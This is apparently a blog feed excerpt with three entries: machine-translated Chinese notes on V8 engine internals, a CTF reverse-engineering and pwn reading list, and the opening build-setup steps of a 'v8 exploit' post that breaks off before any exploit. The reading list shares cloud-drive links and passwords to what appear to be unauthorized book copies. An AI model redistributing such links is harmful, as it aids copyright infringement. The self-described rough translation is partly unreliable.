    <content type="html"><![CDATA[<h2 id="What-is-V8"><a href="#What-is-V8" class="headerlink" title="What is V8?"></a>What is V8?</h2><p>v8是Google的Javascript引擎，它被采用作为Google Chrome/Node.js的Javascript引擎。</p><h2 id="Execution-flow"><a href="#Execution-flow" class="headerlink" title="Execution flow"></a>Execution flow</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-132557.png" alt=""></p><h2 id="Parsing"><a href="#Parsing" class="headerlink" title="Parsing"></a>Parsing</h2><h3 id="Basic-parsing"><a href="#Basic-parsing" class="headerlink" title="Basic parsing"></a>Basic parsing</h3><p>v8解析源代码并将其转换为AST抽象语法树<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-133048.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-133133.png" alt=""></p><h3 id="Split-parsing-phase"><a href="#Split-parsing-phase" class="headerlink" title="Split parsing phase"></a>Split parsing phase</h3><p>首先，直接解析所有的代码并不是很好，如果解析的代码没有被执行，这是没有意义的。<br>为了延迟解析，将parse分为两个阶段。</p><h4 id="PreParsing"><a href="#PreParsing" class="headerlink" title="PreParsing"></a>PreParsing</h4><p>事先解析所有函数的布局。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-133801.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-134324.png" alt=""><br>v8::internal::PreParser Class一次解析函数的轮廓。<br>由此得到</p><ul><li>初步的语法错误检查</li><li>函数的范围生成<h4 id="Lazy-Parsing"><a href="#Lazy-Parsing" class="headerlink" title="Lazy Parsing"></a>Lazy Parsing</h4>v8仅在调用延迟解析的函数时才进行解析。<br>更多的可参考：</li><li><a href="https://docs.google.com/presentation/d/1b-ALt6W01nIxutFVFmXMOyd_6ou_6qqP6S0Prmb1iDs/present?%20slide=id.p&amp;slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1b-ALt6W01nIxutFVFmXMOyd_6ou_6qqP6S0Prmb1iDs/present?%20slide=id.p&amp;slide=id.p</a></li><li><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></li></ul><h2 id="Abstract-Syntax-Tree"><a href="#Abstract-Syntax-Tree" class="headerlink" title="Abstract Syntax Tree"></a>Abstract Syntax Tree</h2><p>V8自己实现的解析器，不使用编译器编译器，如yacc或lex。使用递归下降语法分析进行解析。</p><h3 id="Subsclass-constructor-return"><a href="#Subsclass-constructor-return" class="headerlink" title="Subsclass constructor return"></a>Subsclass constructor return</h3><p>修改继承类中的构造函数<br>在派生类的构造函数中返回表达式<br>转换为三元运算符<br>如果表达式的结果未定义，则返回该值。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-140018.png" alt=""></p><h3 id="for-let-const-var-in-of-e"><a href="#for-let-const-var-in-of-e" class="headerlink" title="for(let/const/var in/of e)"></a>for(let/const/var in/of e)</h3><p>为了在for-in/of的初始化中使用const/let<br>通过将其封闭在一个块中，来声明一个变量<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141224.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141230.png" alt=""></p><h3 id="Spread-operator"><a href="#Spread-operator" class="headerlink" title="Spread operator"></a>Spread operator</h3><p>在JavaScript的语法中，有一个名为Spread运算符的语法。<br>var x = [1，2，3];<br>var y = [… x];<br>V8会将此语法重写为完全不同的语法，如Altus的Transpiler。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141136.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141208.png" alt=""><br>通过这种方式，我们将其重写为等效的do和for of语法</p><h3 id="Ecmascript-–-Binary-AST"><a href="#Ecmascript-–-Binary-AST" class="headerlink" title="Ecmascript? – Binary AST"></a>Ecmascript? – Binary AST</h3><p>正如我们所看到的，AST的大小非常大，所以我们建议压缩它。</p><h2 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h2><h3 id="Bytecode-Interpreter"><a href="#Bytecode-Interpreter" class="headerlink" title="Bytecode Interpreter"></a>Bytecode Interpreter</h3><p>v8在执行之前将生成的AST转换成1到4字节的bytecode</p><h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>Ignition是一种基于寄存器的字节码解释器，它实际上将值分配给CPU的寄存器，并执行它们。<br>在Ignition中，预先生成一个名为BytecodeHandler的字节码处理函数，从字节码中获得一个数组索引。<br>将生成的汇编代码分配给该索引，一个接一个地调用Bytecode数组，调用相应索引的汇编程序并执行代码。</p><h3 id="Pseudo-javascript-code"><a href="#Pseudo-javascript-code" class="headerlink" title="Pseudo javascript code"></a>Pseudo javascript code</h3><p>用Javascript来模拟这个结构，看起来像这样。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-144250.png" alt=""></p><h3 id="How-to-create-bytecode"><a href="#How-to-create-bytecode" class="headerlink" title="How to create bytecode?"></a>How to create bytecode?</h3><p>V8准备一个称为v8::internal::AstVisitor<subclass>的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-141853.png" alt=""></subclass></p><h3 id="BytecodeArray"><a href="#BytecodeArray" class="headerlink" title="BytecodeArray"></a>BytecodeArray</h3><p>生成的bytecode存储在BytecodeArray中。<br>BytecodeArray在函数基础上存在。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-145533.png" alt=""></p><h3 id="InterpreterEntryTrampoline"><a href="#InterpreterEntryTrampoline" class="headerlink" title="InterpreterEntryTrampoline"></a>InterpreterEntryTrampoline</h3><p>最终生成的字节码是从被称为InterpreterEntryTrampoline的Builtin代码执行的。<br>InterpreterEntryTrampoline被编译成Assembly，并且被当成普通的C函数调用。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-150607.png" alt=""></p><h3 id="Ignition-Handler"><a href="#Ignition-Handler" class="headerlink" title="Ignition Handler"></a>Ignition Handler</h3><p>前面伪代码中显示的BytecodeHandlers是V8<br>它被称为Ignition Handler<br>DSL中描述的Ignition Handler被称为CodeStubAssembler</p><h2 id="Code-Generator"><a href="#Code-Generator" class="headerlink" title="Code Generator"></a>Code Generator</h2><p>v8中有几个汇编生成点，如下</p><ul><li>CodeStub</li><li>Builtins</li><li>Runtime</li><li>BytecodeHandler<br>我明白是从Bytecode运行汇编程序，但是相应的汇编程序如何从Bytecode生成？什么是BytecodeHandler?</li></ul><h2 id="CodeStubAssember"><a href="#CodeStubAssember" class="headerlink" title="CodeStubAssember"></a>CodeStubAssember</h2><h3 id="What-is-CodeStubAssmber"><a href="#What-is-CodeStubAssmber" class="headerlink" title="What is CodeStubAssmber?"></a>What is CodeStubAssmber?</h3><p>CodeStubAssembler(CSA)将抽象代码生成为v8内部的graph generation DSL。<br>CodeGenerator只需组装预定的执行节点，即可为每个架构生成代码，因此您不必每次都编写汇编代码。</p><h3 id="Graph-based-DSL"><a href="#Graph-based-DSL" class="headerlink" title="Graph based DSL"></a>Graph based DSL</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-180848.png" alt=""><br>这个代码可以创建一个Graph,在执行时去使用它生成汇编。<br>Graph是使用DSL语言实现的，与c++代码的实际流程不同。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-143547.png" alt=""></p><p>由于使用了CodeStubAssembler，即使您不熟悉实际体系结构的汇编程序，也可以轻松的添加新代码。<br>而且可读性也非常高。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-181353.png" alt=""></p><h3 id="Assembler"><a href="#Assembler" class="headerlink" title="Assembler"></a>Assembler</h3><p>让我们来看看为每个架构实际输出代码的x64的jmp助记符<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-181738.png" alt=""></p><h3 id="Where-is-actually-outputting-the-assembler-in-Code-Generation"><a href="#Where-is-actually-outputting-the-assembler-in-Code-Generation" class="headerlink" title="Where is actually outputting the assembler in Code Generation"></a>Where is actually outputting the assembler in Code Generation</h3><p>名为MacroAssembler的类扮演着其角色。<br>虽然MacroAssembler的接口与体系结构无关，但在其内部调用的Assembler类会输出特定于每个体系结构的代码。<br>在V8中，MacroAssembler经常以属性名称masm频繁出现<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-144042.png" alt=""><br>最后，GraphResolver遍历Graph，通过MacroAssembler调用Assembler并输出汇编程序。</p><p>但是，MacroAssembler是进行最终的代码输出，底层抽象opcode嵌入在Graph中。<br>通过下面的层次结构，生成一个architecture-specific Graph。</p><ul><li>CodeStubAssembler</li><li>CodeAssembler</li><li>RawMachineAssembler</li><li>MachineOperatorBuilder<br>你越往下走，就越具体。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-144522.png" alt=""></li></ul><h3 id="Where-to-use"><a href="#Where-to-use" class="headerlink" title="Where to use"></a>Where to use</h3><p>Builtins使用Assembler class为不同架构生成Stub<br>一些部分使用CSA（*.gen.cc)<br>几乎所有的ignition handlers在CSA中有描述。</p><h2 id="Builtins-amp-Runtime"><a href="#Builtins-amp-Runtime" class="headerlink" title="Builtins &amp; Runtime"></a>Builtins &amp; Runtime</h2><h3 id="Builtins"><a href="#Builtins" class="headerlink" title="Builtins"></a>Builtins</h3><p>Builtins是在v8启动时被编译好的asm code fragment<br>Call Builtin就像call一个函数<br>也被称为Stub<br>没有进行runtime优化</p><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>Runtime是可以从Builtins和其他汇编代码中调用的c++代码<br>连接javascript和c++<br>也没有runtime优化</p><h2 id="Inline-Caching"><a href="#Inline-Caching" class="headerlink" title="Inline Caching"></a>Inline Caching</h2><h3 id="What-is-Inline-Caching"><a href="#What-is-Inline-Caching" class="headerlink" title="What is Inline Caching"></a>What is Inline Caching</h3><p>缓存之前的访问去加速property访问速度<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145001.png" alt=""></p><ul><li>第一次访问<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145015.png" alt=""></li><li>第二次以后的访问<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145029.png" alt=""><h3 id="Search-Property"><a href="#Search-Property" class="headerlink" title="Search Property"></a>Search Property</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145221.png" alt=""><br>为了从对象中找到property<br>从HashMap或者FixedArray加载属性<br>但每次都很慢<h3 id="Reduce-Property-Access"><a href="#Reduce-Property-Access" class="headerlink" title="Reduce Property Access"></a>Reduce Property Access</h3>在这个例子中，对具有相同Map的对象多次执行对y的访问。<br>由于obj已经知道Map(x,y)…<br>当然我们也知道内存布局，所以通过直接指定偏移量来访问会更快。<h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3>所以存储特定map的访问<br>当访问你一个property的时候，Map object被记录<br>这样做之后，第二次和随后的property访问被加速<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-192301.png" alt=""><h3 id="Cache-Miss"><a href="#Cache-Miss" class="headerlink" title="Cache Miss"></a>Cache Miss</h3>但是当Map更改的时候，自然会发生Cache miss，因此需要重新加载该属性并在此记住它。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-150302.png" alt=""><br>Load IC-Miss and StoreIC_Miss被调用，或者通过C++ runtime得到对象的属性。</li></ul><h3 id="Cahce-State"><a href="#Cahce-State" class="headerlink" title="Cahce State"></a>Cahce State</h3><p>Cahce State状态转变如下：<br>PreMonomorphic<br>Monomorphic<br>Polymorphic<br>Megamorphic<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191809.png" alt=""></p><h4 id="Pre-Monomorphic"><a href="#Pre-Monomorphic" class="headerlink" title="Pre Monomorphic"></a>Pre Monomorphic</h4><p>Uninitialized state-&gt;搜寻所用的隐藏类，以及获取位移。（参考上图第一次访问）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191437.png" alt=""></p><h4 id="Monomorphic"><a href="#Monomorphic" class="headerlink" title="Monomorphic"></a>Monomorphic</h4><p>Monomorphic是Receiver的类型不变时的IC，即这是在只访问single Map的理想情况<br>在这种情况下，一个缓存就足够了，所以它将是最快的情况。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191514.png" alt=""></p><h4 id="Polymorphic"><a href="#Polymorphic" class="headerlink" title="Polymorphic"></a>Polymorphic</h4><p>Polymorphic是在两种或更多类型的Receiver类型存在时被设置。<br>由于Polymorphic是循环搜索缓存的Map，找到应该使用的那个，所以它比Monomorphic慢，但比没有IC快得多。<br><strong>（Map存储在FixedArray中，从多个Map搜索并执行属性访问的缓存）</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191552.png" alt=""></p><h4 id="Megamorphic"><a href="#Megamorphic" class="headerlink" title="Megamorphic"></a>Megamorphic</h4><p>由于Miss太多，停止进行Map记录的状态。<br>通过从Stub调用GetProperty，来从哈希表中搜索，是获取properties最慢的状态。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191842.png" alt=""></p><h3 id="Access-inherited-properties"><a href="#Access-inherited-properties" class="headerlink" title="Access inherited properties"></a>Access inherited properties</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192442.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192512.png" alt=""></p><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192553.png" alt=""></p><h2 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h2><h3 id="Hot-or-Small"><a href="#Hot-or-Small" class="headerlink" title="Hot or Small"></a>Hot or Small</h3><p>对满足以下条件的代码优化<br>（function字节码长度/1200）+ function被调用2次<br>函数很小（字节码长度小于90）</p><h3 id="Optimization-Budget"><a href="#Optimization-Budget" class="headerlink" title="Optimization Budget"></a>Optimization Budget</h3><p>Optimization Budget(优化预算）在字节码执行期间被分配给每个函数，当其值低于0时，成为候选优化代码。</p><h3 id="For-loop"><a href="#For-loop" class="headerlink" title="For loop"></a>For loop</h3><p>优化For循环<br>在循环中，输出称为JumpLoop的字节码<br>通过这个JumpLoop，返回终点的地址的值的偏移量被加权<br>从之前的Budget(预算)中扣除一个值，当它变成0的时候，对loop的优化将发生。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-063748.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-064529.png" alt=""></p><h3 id="OSR-OnStackReplacement"><a href="#OSR-OnStackReplacement" class="headerlink" title="OSR - OnStackReplacement"></a>OSR - OnStackReplacement</h3><p>在代码被编译和从bytecode到machine language之后，jump终点被改变，循环代码被切换到优化编译好的机器码。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-183524.png" alt=""></p><h3 id="For-function"><a href="#For-function" class="headerlink" title="For function"></a>For function</h3><p>在函数调用的情况下，计算被Ignition生成的Return Bytecode在BytecodeHandler中的调用次数，如果超过一个阈值，就执行中断，并编译bytecode，替换原来的函数体。<br><strong>（如果是函数，会生成一个Return bytecode,在此处中断并进行budget检查）</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-184051.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065216.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065239.png" alt=""></p><h3 id="Concurrent-Compilation"><a href="#Concurrent-Compilation" class="headerlink" title="Concurrent Compilation"></a>Concurrent Compilation</h3><p>并行编译在对函数进行优化时是异步完成的，因此它不一定会针对后续函数调用进行优化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065540.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065647.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065711.png" alt=""></p><h3 id="Budget-for-function"><a href="#Budget-for-function" class="headerlink" title="Budget for function"></a>Budget for function</h3><p>即使loop被分割，整个预算也会被计算出来，即使是Return也是如此，所以优化没有问题。</p><h2 id="TurboFan"><a href="#TurboFan" class="headerlink" title="TurboFan"></a>TurboFan</h2><h3 id="What-is-TurboFan"><a href="#What-is-TurboFan" class="headerlink" title="What is TurboFan?"></a>What is TurboFan?</h3><p>TurboFan是V8的编译优化组件<br>在V8中，当bytecode的优化编译发生，它生成一个IR<br>TurboFan进行Graph generation和优化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-071141.png" alt=""></p><h3 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h3><p>抽象执行块<br>Control Flow Graph<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-071419.png" alt=""></p><h3 id="Optimization-1"><a href="#Optimization-1" class="headerlink" title="Optimization"></a>Optimization</h3><p>TurboFan优化graph</p><ul><li>inline<br>内联函数调用</li><li>trimming<br>未到达节点删除</li><li>type<br>类型推断</li><li>typed-lowering<br>根据类型将表达式和指令替换为更简单的处理</li><li>loop-peeling<br>取出循环内的处理。</li><li>loop-exit-elimination<br>删除Loop Exit</li><li>load-elimination<br>删除不必要的读取和检查</li><li>simplified-lowering<br>用更具体的值来进行指令的简单转换</li><li>generic-lowering<br>将JS前缀指令转换为更简单的调用和stub调用</li><li>dead-code-elimination<br>删除无法访问的代码</li></ul><h3 id="Code-generation"><a href="#Code-generation" class="headerlink" title="Code generation"></a>Code generation</h3><p>最终，Class InstructionSelector分配寄存器<br>根据Graph，CodeGenerator生成机器码<br>将汇编代码写入PC（ProgramCounter）</p><h2 id="Deoptimization"><a href="#Deoptimization" class="headerlink" title="Deoptimization"></a>Deoptimization</h2><h3 id="What-is-Deoptimization"><a href="#What-is-Deoptimization" class="headerlink" title="What is Deoptimization?"></a>What is Deoptimization?</h3><p>Deoptimization在有意料之外的值被传递到优化后的Assembly code时，对函数重新进行编译。<br>让我们看一个Deoptimization发生的例子</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-080927.png" alt=""></p><h3 id="Wrong-Map"><a href="#Wrong-Map" class="headerlink" title="Wrong Map"></a>Wrong Map</h3><p>在这个例子中，我们为第一个Map{(x)}输出一个优化的Assembly，<br>但是由于第二次调用的是{(x，y)}Map，因此它被强制重新编译<br>让我们看一下汇编<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-081254.png" alt=""></p><h3 id="Bailout"><a href="#Bailout" class="headerlink" title="Bailout"></a>Bailout</h3><p>检查map是否正确<br>当Deoptimization完成后，代码返回到字节码执行</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-184155.png" alt=""><br>以上是V8执行JS的过程<br>为了节省，省略了GC<br>（下载的pdf不能复制粘贴，大部分翻译是谷歌翻译相机拍下来然后识别翻译的，我尽量把我能理解的部分都纠正了）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;What-is-V8&quot;&gt;&lt;a href=&quot;#What-is-V8&quot; class=&quot;headerlink&quot; title=&quot;What is V8?&quot;&gt;&lt;/a&gt;What is V8?&lt;/h2&gt;&lt;p&gt;v8是Google的Javascript引擎，它被采用作为Google 
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>ctf re/pwn入门书单</title>
    <link href="http://eternalsakura13.com/2018/05/31/shudan/"/>
    <id>http://eternalsakura13.com/2018/05/31/shudan/</id>
    <published>2018-05-30T16:42:24.801Z</published>
    <updated>2018-06-01T14:44:50.322Z</updated>
    
    <content type="html"><![CDATA[<p>因为之前经常有人问我入门看什么书……就写一下吧。</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="c-反汇编技术解密"><a href="#c-反汇编技术解密" class="headerlink" title="c++反汇编技术解密"></a>c++反汇编技术解密</h3><p>链接:<a href="https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w" target="_blank" rel="noopener">https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w</a>  密码:k0aa<br>介绍：这本是完整看完了的，后面关于对象和类写的不错。</p><h3 id="使用OllyDbg从零开始Cracking-已完结）"><a href="#使用OllyDbg从零开始Cracking-已完结）" class="headerlink" title="使用OllyDbg从零开始Cracking(已完结）"></a>使用OllyDbg从零开始Cracking(已完结）</h3><p>链接:<a href="https://pan.baidu.com/s/1ntwXQYX" target="_blank" rel="noopener">https://pan.baidu.com/s/1ntwXQYX</a><br>解压密码:pediy<br>介绍：学习od使用的教程，动手实践上不错，翻译和配套资料在看雪可以搜到。</p><h3 id="逆向工程权威指南"><a href="#逆向工程权威指南" class="headerlink" title="逆向工程权威指南"></a>逆向工程权威指南</h3><p><a href="https://beginners.re/" target="_blank" rel="noopener">https://beginners.re/</a><br>链接:<a href="https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g" target="_blank" rel="noopener">https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g</a>  密码:wenn</p><h2 id="pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf-pwn看过的书）"><a href="#pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf-pwn看过的书）" class="headerlink" title="pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf pwn看过的书）"></a>pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf pwn看过的书）</h2><h3 id="0day安全2"><a href="#0day安全2" class="headerlink" title="0day安全2"></a>0day安全2</h3><p>链接:<a href="https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA" target="_blank" rel="noopener">https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA</a>  密码:0zgo<br>介绍：我只看了前半本的内容，书有点老了，感觉看不看没影响。</p><h3 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a>深入理解计算机系统</h3><p>链接:<a href="https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ</a>  密码:yx0s<br>介绍：必读书，读了大概一个周，不求全懂，大概用到的地方都看过了，其他的用到再查了，其实内容也不是很深。</p><h3 id="程序员的自我修养"><a href="#程序员的自我修养" class="headerlink" title="程序员的自我修养"></a>程序员的自我修养</h3><p>链接:<a href="https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ</a>  密码:73pe<br>介绍: 必读的基础书，讲Linux上的程序装载链接什么的，很有意义。</p><h3 id="glibc内存管理ptmalloc源代码分析"><a href="#glibc内存管理ptmalloc源代码分析" class="headerlink" title="glibc内存管理ptmalloc源代码分析"></a>glibc内存管理ptmalloc源代码分析</h3><p>链接:<a href="https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A</a>  密码:su8n<br>介绍：理解Linux堆管理的必读书</p><h3 id="漏洞战争"><a href="#漏洞战争" class="headerlink" title="漏洞战争"></a>漏洞战争</h3><p>链接:<a href="https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w" target="_blank" rel="noopener">https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w</a>  密码:r8i0<br>介绍：很好的书，里面的案例能调的都值得调一下。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>书的话入门看看就好，也没必要从头看到尾，用到的内容记住，其他的知道在哪查就好（反正仔细看完也会忘干净的，指自己）<br>一般一本几百页的书，最多看一个周就看完了，如果我只需要看其中一部分可能更快。<br>大部分学习用到的东西都是谷歌搜索，看PPT和博客，这部分就不补充了（因为太多了）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为之前经常有人问我入门看什么书……就写一下吧。&lt;/p&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;h3 id=&quot;c-反汇编技术解密&quot;&gt;&lt;a href=&quot;#c-反汇编技术解密&quot; c
      
    
    </summary>
    
      <category term="读书笔记" scheme="http://eternalsakura13.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="入门书单" scheme="http://eternalsakura13.com/tags/%E5%85%A5%E9%97%A8%E4%B9%A6%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>v8 exploit</title>
    <link href="http://eternalsakura13.com/2018/05/06/v8/"/>
    <id>http://eternalsakura13.com/2018/05/06/v8/</id>
    <published>2018-05-06T14:10:30.872Z</published>
    <updated>2018-06-18T18:31:24.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="v8的知识结构"><a href="#v8的知识结构" class="headerlink" title="v8的知识结构"></a>v8的知识结构</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h3><ol><li><p>各种依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure></li><li><p>gdb-peda</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scwuaptx/peda.git ~/peda</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure></li><li><p>环境设置<br>ubuntu16.04 x64<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-06-142104.png" alt=""></p></li></ol><h3 id="使用make的方式去编译v8（2016年当时）"><a href="#使用make的方式去编译v8（2016年当时）" class="headerlink" title="使用make的方式去编译v8（2016年当时）"></a>使用make的方式去编译v8（2016年当时）</h3><ol><li><p>depot_tools准备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>v8编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8$ git reset --hard 6ff5881b1def45b35384572f61327e42563a89c3</span><br><span class="line">$ gclient sync</span><br><span class="line">$ make x64.debug -j 8 # 如果这一步出现问题，就按照下面的方式重新编译</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$ mv ./third_party/binutils/Linux_x64/Release/bin/ld.gold&#123;,.old&#125;</span><br><span class="line">$ ln -s &#123;/usr,./third_party/binutils/Linux_x64/Release&#125;/bin/ld.gold</span><br><span class="line">$ make x64.debug -j 8</span><br><span class="line"></span><br><span class="line"># instead of using symbloic link, you can use the following line (thank ishita for helping</span><br><span class="line">$ GYP_DEFINES=&quot;werror= linux_use_bundled_binutils=0 linux_use_bundled_gold=0&quot; make x64.debug -j8</span><br></pre></td></tr></table></figure></li></ol><p><strong>/path/to/根据你自己的环境替换。</strong></p><ol><li>启动<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./out/x64.debug/d8</span><br><span class="line">$ ./out/x64.debug/shell</span><br></pre></td></tr></table></figure></li></ol><h3 id="使用ninja的方式去编译v8（2018现在）"><a href="#使用ninja的方式去编译v8（2018现在）" class="headerlink" title="使用ninja的方式去编译v8（2018现在）"></a>使用ninja的方式去编译v8（2018现在）</h3><ol><li>depot_tools准备<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li></ol><p><strong>/path/to/根据你自己的环境替换。</strong></p><ol><li><p>ninja准备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/ninja-build/ninja.git</span><br><span class="line">$ cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/ninja&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>v8编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; 